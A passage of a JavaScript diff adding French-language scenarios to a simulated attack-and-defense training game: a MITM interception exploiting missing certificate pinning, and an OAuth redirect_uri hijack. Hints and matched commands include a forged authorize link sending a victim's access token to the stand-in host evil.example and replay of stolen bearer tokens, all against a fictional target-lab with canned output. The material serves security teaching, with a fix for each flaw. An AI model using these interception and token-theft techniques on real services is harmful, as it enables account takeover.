+    desc:"Le chiffrement TLS seul ne suffit pas face à un attaquant qui contrôle une autorité de certification de confiance sur l'appareil ou le réseau : épinglez précisément le certificat (ou la clé publique) attendu du serveur, pour que l'application refuse toute connexion interceptée, même avec un certificat par ailleurs valide.",
+    hints:[
+      "Éditez `/etc/mobile/network-security-config.yml` avec `nano` et passez `certificate_pinning` à `enabled`.",
+      "`verify` confirme qu'une interception avec une autorité de certification tierce est désormais rejetée par l'application."
+    ]
+  },
+  makeVfs(){
+    return {
+      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
+      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
+      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
+      '/etc':{type:'dir',perm:'755',owner:'root',children:['mobile']},
+      '/etc/mobile':{type:'dir',perm:'755',owner:'root',children:['network-security-config.yml']},
+      '/etc/mobile/network-security-config.yml':{type:'file',perm:'644',owner:'root',size:40,
+        content:"certificate_pinning: disabled\n"}
+    };
+  },
+  startUserAttack:'bob', startCwdAttack:'/home/bob',
+  exploitRules:[
+    { pattern:/^mitm-status\s+target-lab-app$/, run(state, print){
+        state.flags = state.flags || {};
+        state.flags.scanned = true;
+        print(state.vfs['/etc/mobile/network-security-config.yml'].content, 'out');
+        const disabled = /certificate_pinning:\s*disabled/.test(state.vfs['/etc/mobile/network-security-config.yml'].content);
+        print(disabled ? '[!] Aucun épinglage de certificat configuré — interception possible avec toute autorité de certification de confiance système.' : '[i] Épinglage de certificat actif.', disabled?'info':'out');
+      }
+    },
+    { pattern:/^mitm-intercept\s+target-lab-app\s+--ca\s+rogue-ca\.pem$/, run(state, print){
+        if(!state.flags || !state.flags.scanned){ print("mitm-intercept: vérifiez d'abord la configuration réseau de l'application.", 'err'); return; }
+        const disabled = /certificate_pinning:\s*disabled/.test(state.vfs['/etc/mobile/network-security-config.yml'].content);
+        if(!disabled){ print("[-] Connexion refusée par l'application : le certificat présenté ne correspond pas à celui épinglé.", 'err'); return; }
+        state.flags.tokenCaptured = true;
+        print('[+] Interception TLS acceptée par l\'application — trafic déchiffré.', 'ok');
+        print('Authorization: Bearer stolen_mobile_session_7d1e9c', 'ok');
+      }
+    },
+    { pattern:/^curl\s+https:\/\/api\.target-lab\/mobile\/profile\s+-H\s+'Authorization:\s+Bearer\s+stolen_mobile_session_7d1e9c'$/, run(state, print){
+        if(!state.flags || !state.flags.tokenCaptured){ print('curl: aucun jeton intercepté à réutiliser.', 'err'); return; }
+        state.flags.persisted = true;
+        print('{"user":"victim","sessionValid":true}', 'ok');
+        print("[+] Session de la victime usurpée depuis un tout autre appareil, grâce au jeton intercepté.", 'ok');
+        print("FLAG{mobile_missing_certificate_pinning_token_capture}", 'flagline');
+      }
+    }
+  ],
+  attackCheck(state){ return state.flags && state.flags.persisted === true; },
+  defenseCheck(state){ return /certificate_pinning:\s*enabled/.test(state.vfs['/etc/mobile/network-security-config.yml'].content); },
+  replay(state){
+    const log=[];
+    const disabled = /certificate_pinning:\s*disabled/.test(state.vfs['/etc/mobile/network-security-config.yml'].content);
+    log.push({t:'$ mitm-intercept target-lab-app --ca rogue-ca.pem', cls:'prompt-line'});
+    if(!disabled){
+      log.push({t:"[-] Connexion refusée par l'application : le certificat présenté ne correspond pas à celui épinglé.", cls:'err'});
+      log.push({t:"[-] L'épinglage de certificat est désormais actif : la faille est corrigée.", cls:'err'});
+      return {log, success:false};
+    }
+    log.push({t:"[+] Trafic HTTPS de l'application intercepté et déchiffré, jeton de session capturé.", cls:'ok'});
+    return {log, success:true};
+  }
+},
+
+/* ===================== 74. Redirection OAuth mobile non validée (Mobile & API embarquées) ===================== */
+{
+  id:'mobile-insecure-oauth-redirect-uri-hijack',
+  title:'Une liste blanche de redirection OAuth trop permissive fait fuiter le jeton d\'accès mobile',
+  category:'Mobile & API embarquées (redirect_uri OAuth non validé)',
+  attack:{
+    who:'Vous incarnez bob, un attaquant capable d\'envoyer un simple lien à une victime utilisant déjà l\'application mobile de target-lab (hors périmètre : comment ce lien est diffusé).',
+    desc:"Le serveur d'autorisation OAuth de target-lab accepte n'importe quel `redirect_uri` fourni dans la requête d'autorisation, au lieu de vérifier qu'il correspond à celui enregistré pour l'application mobile. En forgeant un lien d'autorisation pointant vers un domaine qu'il contrôle, l'attaquant récupère directement le jeton d'accès de la victime dans la redirection — sans jamais toucher au serveur ni au compte de la victime autrement que via ce lien.",
+    hints:[
+      "`cat /etc/mobile/deeplink-config.yml` révèle que le serveur d'autorisation accepte n'importe quel hôte de redirection (`allowed_callback_hosts: '*'`), sans jamais le comparer à celui réellement enregistré pour l'application mobile.",
+      "`curl -i 'https://auth.target-lab/oauth/authorize?client_id=mobile-app&redirect_uri=https://evil.example/collect&response_type=token'` simule le lien forgé envoyé à la victime : observez l'en-tête `Location` de la redirection renvoyée.",
+      "La redirection pointe vers `https://evil.example/collect?access_token=...`, le domaine attaquant fourni tel quel dans `redirect_uri` — le jeton d'accès de la victime part directement chez l'attaquant.",
+      "`curl https://api.target-lab/mobile/profile -H 'Authorization: Bearer victim_oauth_access_token'` réutilise ce jeton ainsi intercepté pour accéder au compte de la victime."
+    ]
+  },
+  defense:{
+    who:'Vous incarnez désormais l\'équipe mobile de target-lab chargée de corriger la faille.',
+    desc:"N'acceptez plus qu'une valeur exacte de `redirect_uri`, correspondant précisément à celle enregistrée pour l'application mobile lors de sa création — jamais de jocker ni de correspondance partielle sur le domaine.",
+    hints:[
+      "Éditez `/etc/mobile/deeplink-config.yml` avec `nano` et remplacez `allowed_callback_hosts: '*'` par `allowed_callback_hosts: targetlab://oauth-callback`.",
+      "`verify` confirme qu'un `redirect_uri` extérieur à l'application est désormais rejeté par le serveur d'autorisation."
+    ]
+  },
+  makeVfs(){
+    return {
+      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
+      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
+      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
+      '/etc':{type:'dir',perm:'755',owner:'root',children:['mobile']},
+      '/etc/mobile':{type:'dir',perm:'755',owner:'root',children:['deeplink-config.yml']},
+      '/etc/mobile/deeplink-config.yml':{type:'file',perm:'644',owner:'root',size:50,
+        content:"allowed_callback_hosts: '*'\n"}
+    };
+  },
+  startUserAttack:'bob', startCwdAttack:'/home/bob',
+  exploitRules:[
+    { pattern:/^cat\s+\/etc\/mobile\/deeplink-config\.yml$/, run(state, print){
+        state.flags = state.flags || {};
+        state.flags.confirmed = true;
+        print(state.vfs['/etc/mobile/deeplink-config.yml'].content, 'out');
+      }
+    },
+    { pattern:/^curl\s+-i\s+'https:\/\/auth\.target-lab\/oauth\/authorize\?client_id=mobile-app&redirect_uri=https:\/\/evil\.example\/collect&response_type=token'$/, run(state, print){
+        if(!state.flags || !state.flags.confirmed){ print("curl: vérifiez d'abord la configuration des redirections autorisées.", 'err'); return; }
+        const wildcard = /allowed_callback_hosts:\s*'\*'/.test(state.vfs['/etc/mobile/deeplink-config.yml'].content);
+        if(!wildcard){ print('HTTP/1.1 400 Bad Request\nredirect_uri not in allow-list for this client.', 'err'); return; }
+        state.flags.redirected = true;
+        print('HTTP/1.1 302 Found\nLocation: https://evil.example/collect?access_token=victim_oauth_access_token', 'ok');
+        print("[i] Le redirect_uri fourni par l'attaquant est accepté tel quel, jamais comparé à celui enregistré pour l'application.", 'info');
+      }
+    },
+    { pattern:/^curl\s+https:\/\/api\.target-lab\/mobile\/profile\s+-H\s+'Authorization:\s+Bearer\s+victim_oauth_access_token'$/, run(state, print){
+        if(!state.flags || !state.flags.redirected){ print('curl: aucun jeton intercepté à réutiliser.', 'err'); return; }
+        state.flags.persisted = true;
+        print('{"user":"victim","email":"victim@target-lab.local"}', 'ok');
+        print("[+] Compte de la victime accédé depuis un tout autre appareil, via le jeton intercepté dans la redirection OAuth.", 'ok');
+        print("FLAG{mobile_insecure_oauth_redirect_uri_token_leak}", 'flagline');
+      }
+    }
+  ],
+  attackCheck(state){ return state.flags && state.flags.persisted === true; },
+  defenseCheck(state){ return !/allowed_callback_hosts:\s*'\*'/.test(state.vfs['/etc/mobile/deeplink-config.yml'].content); },
+  replay(state){
+    const log=[];
+    const wildcard = /allowed_callback_hosts:\s*'\*'/.test(state.vfs['/etc/mobile/deeplink-config.yml'].content);
+    log.push({t:"$ curl -i 'https://auth.target-lab/oauth/authorize?client_id=mobile-app&redirect_uri=https://evil.example/collect&response_type=token'", cls:'prompt-line'});
+    if(!wildcard){
+      log.push({t:'HTTP/1.1 400 Bad Request\nredirect_uri not in allow-list for this client.', cls:'err'});
+      log.push({t:"[-] Seul le redirect_uri enregistré pour l'application est désormais accepté : la faille est corrigée.", cls:'err'});
+      return {log, success:false};
+    }
+    log.push({t:"[+] Jeton d'accès de la victime redirigé vers le domaine attaquant.", cls:'ok'});
+    return {log, success:true};
+  }
 }
 
 ];
